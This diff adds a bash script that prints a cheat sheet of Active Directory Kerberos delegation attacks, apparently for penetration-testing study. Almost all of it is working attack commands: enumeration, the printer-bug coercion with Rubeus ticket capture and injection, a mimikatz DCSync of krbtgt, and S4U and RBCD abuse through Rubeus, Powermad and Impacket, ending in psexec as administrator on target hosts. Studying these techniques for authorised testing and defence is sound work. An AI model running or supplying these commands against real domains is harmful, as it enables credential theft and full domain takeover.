@@ -1,0 +1,64 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── DELEGATION ATTACKS ───────────────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enumerate ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}Get-DomainComputer -Unconstrained | Select-Object dnshostname${NC}  # unconstrained"
+echo -e "  ${GREEN}Get-DomainUser -TrustedToAuth${NC}                                   # constrained (users)"
+echo -e "  ${GREEN}Get-DomainComputer -TrustedToAuth${NC}                               # constrained (computers)"
+echo -e "  ${GREEN}nxc ldap <TARGET> -u <USER> -p <PASS> --find-delegation${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Unconstrained Delegation + Printer Bug ───────────${NC}"
+echo -e "  Note: DCs are unconstrained by default — only target non-DC hosts."
+printf "\n"
+echo -e "  Note: On compromised unconstrained host — Windows:"
+echo -e "  ${GREEN}.\\Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01\$${NC}    # wait for TGT"
+echo -e "  ${GREEN}.\\SpoolSample.exe DC01 COMPROMISED_HOST${NC}                        # coerce DC auth"
+echo -e "  ${GREEN}.\\Rubeus.exe ptt /ticket:<BASE64>${NC}                               # inject captured TGT"
+echo -e "  ${GREEN}mimikatz # lsadump::dcsync /domain:corp.com /user:krbtgt${NC}        # DCSync"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Constrained Delegation (S4U2Self + S4U2Proxy) ────${NC}"
+echo -e "  Note: Look for: msds-allowedtodelegateto, TRUSTED_TO_AUTH_FOR_DELEGATION"
+printf "\n"
+echo -e "  Note: Rubeus — Windows:"
+echo -e "  ${GREEN}.\\Rubeus.exe asktgt /user:iissvc /domain:corp.com /rc4:<HASH> /nowrap${NC}"
+echo -e "  ${GREEN}.\\Rubeus.exe s4u /ticket:<TGT_B64> /impersonateuser:administrator /msdsspn:mssqlsvc/sql01.corp.com:1433 /ptt${NC}"
+echo -e "  Note: altservice trick (arbitrary SPN swap):"
+echo -e "  ${GREEN}.\\Rubeus.exe s4u /ticket:<TGT_B64> /impersonateuser:administrator /msdsspn:www/web01 /altservice:CIFS /ptt${NC}"
+printf "\n"
+echo -e "  Note: Impacket — from Kali:"
+echo -e "  ${GREEN}impacket-getTGT corp.com/iissvc -hashes :12bb0b468b42c76d48a3a5ceb8ade2e9${NC}"
+echo -e "  ${GREEN}export KRB5CCNAME=iissvc.ccache${NC}"
+echo -e "  ${GREEN}impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass${NC}"
+echo -e "  ${GREEN}export KRB5CCNAME=administrator.ccache${NC}"
+echo -e "  ${GREEN}impacket-psexec administrator@sql01.corp.com -k -no-pass${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── RBCD (Resource-Based Constrained Delegation) ─────${NC}"
+echo -e "  Note: Pre-condition: GenericWrite / GenericAll / WriteDACL on a computer object."
+printf "\n"
+echo -e "  Note: From Kali — impacket:"
+echo -e "  ${GREEN}impacket-addcomputer -computer-name 'myComputer\$' -computer-pass 'h4x' corp.com/mary -hashes :<HASH>${NC}"
+echo -e "  ${GREEN}impacket-rbcd -action write -delegate-to 'BACKUP01\$' -delegate-from 'myComputer\$' corp.com/mary -hashes :<HASH>${NC}"
+echo -e "  ${GREEN}impacket-getST -spn cifs/backup01.corp.com -impersonate administrator 'corp.com/myComputer\$:h4x'${NC}"
+echo -e "  ${GREEN}export KRB5CCNAME=administrator.ccache${NC}"
+echo -e "  ${GREEN}impacket-psexec administrator@backup01.corp.com -k -no-pass${NC}"
+printf "\n"
+echo -e "  Note: Windows — Powermad + PowerView:"
+echo -e "  ${GREEN}New-MachineAccount -MachineAccount myComputer -Password \$(ConvertTo-SecureString 'h4x' -AsPlainText -Force)${NC}"
+echo -e "  Note: Set msds-allowedtoactonbehalfofotheridentity on target with myComputer\$ SID"
+echo -e "  ${GREEN}.\\Rubeus.exe s4u /user:myComputer\$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:CIFS/appsrv01.corp.com /ptt${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
